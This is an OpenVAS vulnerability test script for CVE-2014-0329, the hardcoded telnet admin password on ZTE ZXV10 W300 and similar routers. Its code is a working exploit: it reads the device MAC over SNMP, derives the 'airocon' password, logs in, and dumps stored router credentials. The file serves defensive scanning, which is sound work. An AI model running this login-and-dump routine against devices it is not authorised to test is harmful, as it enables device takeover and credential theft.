###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zxv10_w300_hardcoded_credentials_2014.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# ZTE ZXV10 W300 Wireless Router Hardcoded Credentials Security Bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103903");
  script_bugtraq_id(65310);
  script_cve_id("CVE-2014-0329");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 11867 $");

  script_name("ZTE ZXV10 W300 Wireless Router Hardcoded Credentials Security Bypass Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65310");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-02-10 13:47:33 +0100 (Mon, 10 Feb 2014)");
  script_tag(name:"qod_type", value:"exploit");
  script_category(ACT_ATTACK);
  script_family("Default Accounts");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_snmp_sysdesc.nasl", "telnetserver_detect_type_nd_version.nasl");
  script_require_ports("Services/telnet", 23);
  script_require_udp_ports("Services/udp/snmp", 161);

  script_tag(name:"impact", value:"Attackers can exploit this issue to bypass the authentication
mechanism and gain access to the vulnerable device.");
  script_tag(name:"vuldetect", value:"Try to login into the telnet service.");
  script_tag(name:"insight", value:"The TELNET service on the ZTE ZXV10 W300 router 2.1.0
has a hardcoded password ending with airocon for the admin account,
which allows remote attackers to obtain administrative access by
leveraging knowledge of the MAC address characters present at the
beginning of the password.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"ZTE ZXV10 W300 wireless router is prone to a security-bypass
vulnerability.");
  script_tag(name:"affected", value:"ZTE ZXV10 W300 running firmware version 2.1.0 is vulnerable. Other
versions may also be affected.

Update 2015-08-28: At least the following models are also affected:

Asus: DSL N12E

Digicom: DG-5524T

Observa :RTA01N

PLDT: SpeedSurf 504AN

ZTE: ZXV10 W300");
  exit(0);
}

include("telnet_func.inc");
include("dump.inc");
include("snmp_func.inc");

snmp_port = get_snmp_port(default:161);
sysdesc = get_snmp_sysdesc(port:snmp_port);

telnet_port = 23;
if( ! get_port_state( telnet_port ) ) exit( 0 );

if( sysdesc =~ "(ZXV|N12E|SpeedSurf|RTA|DG-)" ) device = TRUE;

if( ! device )
{
  banner = get_telnet_banner( port:telnet_port );
  if( banner && ( "User Access Verification" >< banner && "Username:" >< banner ) || banner =~ "(ZXV|N12E|SpeedSurf|RTA|DG-)"  ) device = TRUE;
}

if( ! device ) exit( 0 );

community = snmp_get_community( port:snmp_port );
if( ! community ) community = "public";

SNMP_BASE = 38;
COMMUNITY_SIZE = strlen( community );
sz = COMMUNITY_SIZE % 256;

len = SNMP_BASE + COMMUNITY_SIZE;

for( i = 0; i < 3; i++ )
{
  soc = open_sock_udp( snmp_port );
  if( ! soc ) exit( 0 );
  # snmpget -v1 -c <community> <target> .1.3.6.1.2.1.2.2.1.6.10000
  sendata = raw_string(0x30,len,0x02,0x01,i,0x04,sz) +
            community +
            raw_string(0xa0,0x1f,0x02,0x04,0x2d,0xc7,0xb1,0x92,
                       0x02,0x01,0x00,0x02,0x01,0x00,0x30,0x11,
                       0x30,0x0f,0x06,0x0b,0x2b,0x06,0x01,0x02,
                       0x01,0x02,0x02,0x01,0x06,0xce,0x10,0x05,
                       00);

  send( socket:soc, data:sendata );
  result = recv( socket:soc, length:400, timeout:1 );
  close( soc );

  if( ! result || ord( result[0] ) != 48 )continue;

  res = hexstr( result );
  mac = toupper( substr( res, ( strlen( res ) - 4 ) ) );

  if( ! mac || strlen( mac ) != 4 ) exit( 0);

  pass = mac + 'airocon';

  soc = open_sock_tcp (telnet_port );
  if( ! soc ) exit( 0 );
  recv = telnet_negotiate( socket:soc );

  send( socket:soc, data: 'admin\r\n');
  recv = recv( socket:soc, length:2048);
  if( "Password:" >!< recv ) exit( 0 );

  send( socket:soc, data: pass + '\r\n');
  recv = recv( socket:soc, length:2048);
  if( "$" >!< recv ) exit( 99 );

  send( socket:soc, data: 'sh\r\n');
  recv = recv( socket:soc, length:2048);
  if( "ADSL#" >!< recv ) exit( 0 );

  send( socket:soc, data: 'login show\r\n');
  recv = recv( socket:soc, length:2048);
  close( soc );

  if( "Username" >< recv && "Password" >< recv && "Priority" >< recv )
  {
    report = 'By using "admin" as username and "' + pass + '" as password\n' +
             'it was possible to login and to obtain the following credentials:\n' +
              recv + '\n';
    security_message( port: telnet_port, data: report );
    exit( 0 );
  }
}

exit( 99 );
